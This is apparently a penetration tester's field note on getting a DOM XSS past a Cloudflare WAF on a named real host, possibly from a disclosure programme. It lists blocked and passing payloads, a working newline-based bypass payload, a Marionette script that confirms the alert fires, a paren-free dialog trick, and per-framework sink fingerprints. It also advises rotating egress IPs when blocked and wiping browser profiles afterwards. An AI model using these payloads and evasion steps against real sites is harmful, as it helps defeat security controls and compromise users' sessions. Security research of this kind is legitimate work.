# CDN/WAF in front of a DOM sink — measured bypass ladder

Session: 2026-10-19, `mobileapp.connecteam.com` (CloudFront origin behind Cloudflare).
Sink: `document.getElementById("verify-code").innerHTML = url.searchParams.get("token")`.

## 1. Why the normal reflection workflow fails here

The value is never reflected server-side — the page is static HTML and the token is read from
`URL` client-side. `curl` will always return the same 5 KB page, so **body grep proves nothing**.
Every verdict has to come from a browser DOM inspection or a captured dialog.

## 2. Characterising the filter (payload ladder)

Send each candidate, record status. The block page is Cloudflare's
`Attention Required! | Cloudflare`; a challenge page is `Just a moment...` — different things
(the first is a WAF deny, the second may self-solve in a browser).

```
PASS  <img src=x>
PASS  <b>(</b>                        # parens are NOT globally blocked
PASS  <b>a(1)</b>                     # a call in body text is fine
BLOCK onerror=alert(1)                # the rule is on the *event-handler call shape*
BLOCK onerror=a(1)
BLOCK onerror=(1)
BLOCK onerror=alert&#40;1&#41;         # numeric entity
BLOCK onerror=alert&#x28;1&#x29;       # hex entity
BLOCK onerror=alert&#000028;1&#000029; # padded entity
BLOCK onerror=alert&lpar;1&rpar;      # named entity (with semicolons)
BLOCK onerror=alert`1`                # tagged template
BLOCK onerror=eval`1`
BLOCK javascript:alert%281%29         # scheme, incl. tab/newline inside the scheme
BLOCK throw 1
BLOCK onerror=window.q=1              # `window.`
BLOCK onerror=self.document.title=1   # `document.`
PASS  onerror=alert                   # bare reference
PASS  onerror=self.__XSS=1            # assignment — executes
PASS  onerror=a=1;b=2                 # semicolons fine
PASS  onerror=self.i=new Image        # `new` without parens fine
BLOCK onerror=alert\t(1)              # tab between callee and (
BLOCK onerror=alert\f(1)              # form-feed
PASS  onerror=alert\n(1)              # *** BYPASS *** — but only when quoted
BLOCK onerror=alert\n(1)  unquoted    # parser splits at the newline → no execution
```

Key mechanics learned:
- The edge **normalises percent-encoding and HTML entities** before matching, so entity tricks
  (`&lpar;`, `&#x28;`, padded numerics) do not survive. Don't burn a cycle assuming they will.
- The rule keys on the **call shape after an `on*=`, not on the character `(`**. That is why
  `<b>a(1)</b>` passes while `onerror=a(1)` fails.
- Double-encoding fails for a second reason: `searchParams.get()` decodes **once**, so `%2528`
  becomes the literal text `%28`, which is not a paren to JS.

## 3. The working payload

```
token=%3Cimg%20src%3Dx%20onerror%3D%22alert%0A%281%29%22%3E
```
= `<img src=x onerror="alert\n(1)">`

- `%0A` = LF. WAF's regex is single-line; JS ignores the line break between callee and arguments.
- Quotes matter: the HTML tokenizer terminates an **unquoted** attribute value at whitespace,
  so unquoted the handler becomes `alert` and `(1)` becomes a stray attribute.
- Verify the sink: `document.getElementById('verify-code').innerHTML` should read back
  `<img src="x" onerror="alert\n(1)">`.

## 4. Confirming execution (Marionette)

```python
from marionette_driver.marionette import Marionette
import time, urllib.parse
m = Marionette('localhost', port=2828); m.start_session()
PAY = '<img src=x onerror="alert\n(1)">'
url = "https://target/Verify/index.html?token=" + urllib.parse.quote(PAY, safe='')
m.navigate(url); time.sleep(3)
a = m.switch_to_alert()
print("DIALOG:", repr(a.text))   # '1'
a.accept()
```

Notes:
- Do **not** call `m.title` while an alert is open — it raises `UnexpectedAlertOpen`, and that
  exception's message itself contains the dialog text (usable as a fallback proof).
- Reproduce twice before reporting. Both runs returned `'1'`.
- If the page is behind a challenge that self-solves, poll `m.title` until it is no longer
  `Just a moment...`; a fresh private profile solves it, an already-flagged one gets
  `Attention Required!` forever.

## 5. Cross-framework state-blob fingerprints (from the TNS VDP pass)

Same session family, different lesson: on a 96-host estate the *first* thing to establish is whether
a "reflection" is a sink at all. Strip `<script>`/`<style>` and re-search for the marker; if it only
exists inside a script block it is inert until a consumer is proven.

| stack | where the value lands | tell |
|---|---|---|
| Drupal 7/9/10 | `<script data-drupal-selector="drupal-settings-json">` → `"currentQuery":{"q":"VALUE"}` | JSON-encoded, deep in doc |
| Drupal webform | `action="/?q=VALUE"` on the in-page contact form | query is **URL-encoded** (`a"b` → `a%22b`) on every Drupal 10 host tested — no attribute breakout |
| WordPress + Yoast | `<title>You searched for VALUE \| Site</title>`, `og:title`, `og:url` | `esc_html` entities; `<img …>` stripped entirely; theme may addslashes (stray `\`) but the quote stays `&quot;` |
| Azure/APIM JSON error | body echo of the raw value | `Content-Type: text/plain` + `nosniff` → re-request with `Accept: text/html`; a **406** settles it |

**Imperva** (distinct from Cloudflare): block page is `Request Rejected`, HTTP **200**, ~247 bytes,
with a `Your support ID is:` line. Drupal `<script>` payloads never reach origin. Don't file the
block page as a finding, and don't retry — it is a WAF deny, not a challenge.

**Paren-free dialog when every call syntax is filtered:** `onerror=self.onerror=alert;self.x.y`
binds `window.onerror` to `alert`, then dereferences an undefined property; the uncaught
`TypeError` invokes the handler → a dialog opens with no call syntax anywhere in the payload.
Confirmed dialog text: `TypeError: can't access property "y", self.x is undefined`. Proves
execution, but you don't control the argument — use it as proof, not as the PoC payload.

**Ops tell:** if `curl` returns 200 while the browser gets `Attention Required`, that is an
IP+fingerprint block on the browser, not a broken browser. Stop and rotate egress; do not debug
Marionette.

## 6. History hygiene when the operator asks for it

Launch with `--private-window` on a throwaway profile (`/tmp/ff-xss`), then kill the process and
`rm -rf` the profile. Kill by matching the exact profile string in `ps`, **not** `pkill -f` on a
pattern that also appears in your own shell command — that kills the shell and the `rm` never
runs.
